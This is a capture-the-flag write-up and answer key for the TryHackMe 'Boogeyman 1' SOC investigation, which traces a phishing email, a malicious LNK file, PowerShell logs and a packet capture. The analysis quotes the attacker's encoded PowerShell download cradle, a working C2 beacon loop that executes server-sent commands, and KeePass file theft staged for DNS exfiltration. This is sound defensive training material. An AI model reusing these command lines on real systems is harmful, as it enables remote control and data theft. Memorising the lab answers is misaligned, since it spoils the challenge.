---
title: Boogeyman 1
module: SOC Level 1 Capstone Challenges
path: SOC Level 1
platform: TryHackMe
tags: [phishing-analysis, email-headers, eml, lnk-analysis, lnkparse, base64, powershell-logs, jq, log-analysis, wireshark, tshark, pcap, c2, exfiltration, keepass, capstone]
status: 
date: 2026-07-31
date_completed: 2026-07-31
---
*Write-up by [Miyu7x](https://github.com/Miyu7x) | TryHackMe: [Miyu7](https://tryhackme.com/p/Miyu7) | BTLO: [Miyu7x](https://blueteamlabs.online/public/user/Miyu7x)*

<p align="center">
<img src=screenshots/boogeyman.png width="1500">
</p>

---

## TASK 1 - [Introduction] New threat in town.

- Capstone challenge in the SOC Level 1 path, built around a threat group called Boogeyman
- Goal is to trace the full TTP chain from initial access through to the actor's objective
- Attack starts with a phishing email and ends with data exfiltration off a finance workstation
- Three artefacts provided in `/home/ubuntu/Desktop/artefacts`: a phishing email (`dump.eml`), PowerShell logs from the victim workstation (`powershell.json`), and a packet capture (`capture.pcapng`)
- PowerShell logs are JSON converted from the original evtx via evtx2json
- Toolkit on the VM: Thunderbird, LNKParse3, Wireshark, Tshark, jq, plus grep / sed / awk / base64
- Pulls together phishing analysis, Windows event logs, and traffic analysis into one investigation

<p align="center">
<img src=screenshots/boogeyman1.png width="700">
</p>


---

## TASK 2 - [Email Analysis] Look at that headers!

### The Boogeyman is here!

- Julianne works in finance at Quick Logistics LLC
- She got a follow-up email about an unpaid invoice, appearing to come from a business partner, B Packaging Inc
- The attachment was malicious and compromised her workstation
- Other finance employees also submitted phishing reports, which points to the finance team being targeted deliberately
- The security team flagged the attachment execution and matched the initial TTP to the Boogeyman group, known for hitting the logistics sector
- Task here is to analyze the email and assess the impact of the compromise

### Investigation Guide

### 1. What is the email address used to send the phishing email?

The first in the investigation is to open the dump.eml on thunderbird: thunderbird ~/Desktop/artefacts/dump.eml
  - First step I'll set to view the message body as text, which shows any full links.
  - Next inspect the source, this will give us the header metadada  

<p align="center">
<img src=screenshots/boogeyman-sender.png width="700">
</p>

**Answer: agriffin@bpakcaging.xyz**

---

### 2. What is the email address of the victim?

<p align="center">
<img src=screenshots/boogeyman-receiver.png width="700">
</p>

**Answer: julianne.westcott@hotmail.com**

---

### 3. What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?

This is a major red flag when inspecting potential phishing emails; if the DKIM signature does not match the email address you read when you first open your email, something is wrong. 
-This case email shows its from: agriffin@bpakcaging.xyz but we see that it actually belongs to elasticemail.
<p align="center">
<img src=screenshots/boogeyman-elasticemail.png width="700">
</p>

**Answer: elasticemail**

---

### 4. What is the name of the file inside the encrypted attachment?

Continuing to investigate the source of the email contents, we can spot a file and file name, but if you notice, it is encoded in base64.
```
Content-Type: application/zip
Content-Disposition: attachment; filename="Invoice.zip"; size=908;
Content-Transfer-Encoding: base64

UEsDBBUEsDBBQAAQAIAGiGLVZRFQDJ3gIAACgJAAAUAAAASW52b2ljZV8yMDIzMDEwMy5sbmvuhS6......
```
Lets decode the file and add an extra line in at the end in case bash dosent print the entire line:
```
echo "UEsDBBUEsDBBQAAQAIAGiGLVZRFQDJ3gIAACgJAAAUAAAASW52b2ljZV8yMDIzMDEwMy5sbmvuhS6......" | base64 -d; echo ""
```
<p align="center">
<img src=screenshots/boogeyman-invoice.png width="700">
</p>

**Answer: Invoice_20230103.lnk**

---

### 5. What is the password of the encrypted attachment?

Our next step is to unzip the malicious attachment; since we are on Linux, it is safe to unzip the file in order to read its contents!
Once we unzip the file, it will ask for a password to view te encrypted contents. The password was provided for us in the original body of the email message.
  - You may use this code to view the encrypted file: Invoice2023!
<p align="center">
<img src=screenshots/boogeyman-invoice2023.png width="700">
</p>

**Answer: Invoice2023!**

---

### 6. Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?

I want to locate the Python3 lnkparse tool: 
```
which lnkparse
/home/ubuntu/.local/bin/lnkparse
~/.local/bin/lnkparse Invoice_20230103.lnk
```
```
 DATA
      Description: Invoice Jan 2023
      Relative path: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
      Working directory: C:
      Command line arguments: -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
      Icon location: C:\Users\Administrator\Desktop\excel.ico
```
<p align="center">
<img src=screenshots/boogeyman-encoded.png width="700">
</p>

**Answer: aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==**

---

## TASK 3 - [Endpoint Security] Are you sure that's an invoice?

### Investigation Guide

We can summarize the first part:
  - A PowerShell command was executed
  - Decoding the payload reveals the starting point of endpoint activities

Next Steps:
  - Analyze PowerShell logs
  - Data is JSON; parse it in the CLI with ```jq``` command
  - Some logs might have no valuable information at all, ignore them

### JQ Cheatsheet

| Action | Command |

**jq -r '.[] | .ScriptBlockText' powershell.json | less -S**
  - -S stops long lines from wrapping into soup, arrow keys scroll sideways
**jq -r '.[] | "=== \(.ScriptBlockText)"' powershell.json**
  - gives you a visual separator at the top of every block, which is the thing you were actually missing
**jq 'keys' powershell.json or jq '.[0] | keys'**
  - shows what other fields exist before you commit to grepping the wrong one. Timestamps and host fields are usually in there and usually needed two questions later
**jq -r '.[] | select(.ScriptBlockText | test("http"))' powershell.json**
  - filter inside jq instead of piping to grep, so you keep the surrounding fields instead of losing them

---

### 1. What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)

To find these domains, we can use the PowerShell.json log. The commands provided 

I tried the commands provided by the room and it was nearly impossible to read, I did some reserach and if we format with ```jq .``` it makes things more readbale.
```
jq . powershell.json | grep -i "http"
```

We observe obvious signs of C2
```
"ScriptBlockText": "$s='cdn.bpakcaging.xyz:8080';$i='8cce49b0-b86459bb-27fe2489';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{\"X-38d2-8f49\"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{\"X-38d2-8f49\"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{\"X-38d2-8f49\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}\n",
```

**C2: A two way conversation that repeats is the strongest clue if you read the structure**
  - A loop ```while ($true)``` and a ```sleep``` at the end of the body
  - GET task and POST carrying the output
  - iex applied to whatever server returned
  - endpointnames that are opaque IDs rather than filenames

<p align="center">
<img src=screenshots/boogeyman-domains.png width="700">
</p>

**Answer: cdn.bpakcaging.xyz,files.bpakcaging.xyz**

---

### 2. What is the name of the enumeration tool downloaded by the attacker?

In our previous question, we saw a tool being downloaded from Git.
```
ubuntu@tryhackme:~/Desktop/artefacts$ jq . powershell.json | grep -i "http"
  "ScriptBlockText": "iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd",
```

**Answer: Seatbelt**

---

### 3. What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.

We find the path is in double backslashes, but it's missing the user and the full path!
Command: 
```
jq . powershell.json | grep -iE "sq3" -C 3
"Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": ".\\Music\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite \"SELECT * from NOTE limit 100\";pwd",
  "ScriptBlockId": "9e18c093-4a63-44a1-832a-9d252b09568d",
  "Path": null
```
Command: 
```
jq . powershell.json | grep -iE "Users" -C 2
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "cd Users;pwd",
  "ScriptBlockId": "0725ddcd-fe90-48a7-8329-ff692012801b",
  "Path": null
--
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "ls C:\\Users\\j.westcott\\Documents\\protected_data.kdbx;pwd",
  "ScriptBlockId": "edd98383-cd2f-4410-81f9-c4ced9b27ab1",
  "Path": null
--
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "$file='C:\\Users\\j.westcott\\Documents\\protected_data.kdbx'; $destination = \"167.71.211.113\"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd",
  "ScriptBlockId": "35d938ea-f850-4089-a382-4255a76df1e9",
  "Path": null
```

<p align="center">
<img src=screenshots/boogeyman-sq3.png width="700">
</p>
<p align="center">
<img src=screenshots/boogeyman-sq32.png width="700">
</p>

**Answer: C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite**

---

### 4. What is the software that uses the file in Q3?

When we searched for the sq3 executable we could spot a Microsoft.MicrosoftStickyNotes
<p align="center">
<img src=screenshots/boogeyman-sticky.png width="700">
</p>

**Answer: Microsoft Sticky Notes**

---

### 5. What is the name of the exfiltrated file?

While filtering for: jq • powershell.json | grep -iE "Users" -C 4
We spotted the last event; the destination here is key evidence, along with an outbound IP 167.71.211.113 
```
"Level": "Verbose",
"Descr": "Creating Scriptblock text (‹MessageNumber> of ‹MessageTotal>)",
"MessageNumber": "1"
"MessageTotal": "1"
"ScriptBlockText": "Sfile='C: ||Users|\J.westcott||Documents||protected_data.kdbx'; Sdestination = \"167.71.211.113\";
$bytes = [System. IO.File]::ReadAllBytes(Sfile);;pwd"
"ScriptBlockId": "35d938ea- f850-4089-a382-4255a76df1e9",
"Path": null
```
<p align="center">
<img src=screenshots/boogeyman-protective.png width="700">
</p>
**Answer: protected_data.kdbx**

---

### 6. What type of file uses the .kdbx file extension?

I used OSINT here and looked up what type of file it was,
<p align="center">
<img src=screenshots/boogeyman-keepass.png width="700">
</p>

**Answer: keepass**

---

### 7. What is the encoding used during the exfiltration attempt of the sensitive file?

```ScriptBlockText": "$file='protected_data.kdbx'; $destination = \"167.71.211.113\"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd"```

Bytes is truncated here so lets search for bytes! 
jq . powershell.json | grep -iE "bytes" -C 10

```"ScriptBlockText": "$hex = ($bytes|ForEach-Object ToString X2) -join '';;pwd",```
 

**Answer: hex**

---

### 8. What is the tool used for exfiltration?

We noted $destination earlier, and we know that's used for exfiltration, so let's look at the events with that information. 
<p align="center">
<img src=screenshots/boogeyman-destination.png width="700">
</p>

**Answer: nslookup**

---

## TASK 4 - [Network Traffic Analysis] They got us. Call the bank immediately!

### Investigation Guide

  - Utilize the domains and ports discovered from the previous task.
  - All commands executed by the attacker and all command outputs were logged and stored in the packet capture.
  - Follow the streams of the notable commands discovered from PowerShell logs.
  - Based on the PowerShell logs, we can retrieve the contents of the exfiltrated data by understanding how it was encoded and extracted.
---

### 1. What software is used by the attacker to host its presumed file/payload server?

We found this valuable piece of information when investigating exfiltration. $destination = \"167.71.211.113\"
Wireshark: http.response and ip.src == 167.71.211.113
In the Hypertext Transfer Protocol we find valuable information such as the server hosting the data we are investigating.
<p align="center">
<img src=screenshots/boogeyman-python.png width="700">
</p>

**Answer: Python**

---

### 2. What HTTP method is used by the C2 for the output of the commands executed by the attacker?

Earlier in our investigation, we noted: 
We observe obvious signs of C2
```
"ScriptBlockText": "$s='cdn.bpakcaging.xyz:8080';$i='8cce49b0-b86459bb-27fe2489';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{\"X-38d2-8f49\"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{\"X-38d2-8f49\"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{\"X-38d2-8f49\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}\n",
```
This is why it's always important to document every single step, because some answers you may be looking for you might have already found.

**Answer: POST**

---

### 3. What is the protocol used during the exfiltration activity?

There are two critical clues for exfiltration: the $destination: 167.71.211.113 and $destination: nslookup

The **nslookup** protocol can be used to exfiltrate data, as attackers will hide information directly into the subdomains of the DNS request.
  - To spot DNS exfiltration in Wireshark
      - dns.flags.response == 0
      - this filters for DNS Requests and Queries 

**Answer: DNS**

---

### 4. What is the password of the exfiltrated file?

**Answer: **

---

### 5. What is the credit card number stored inside the exfiltrated file?

**Answer:**

---

## TASK 5 - [Conclusion]

- Full chain reconstructed: phishing email with a password-protected archive, an LNK payload dropping an encoded PowerShell command, then hands-on-keyboard activity over C2
- Endpoint side showed the actor pulling down tooling, enumerating the host, and reaching into a password vault file
- Network side confirmed the C2 pattern and let the exfiltrated data be recovered straight out of the capture
- Good demonstration of why one artefact alone is never enough -- the email gave initial access, the PowerShell logs gave intent, the pcap gave proof
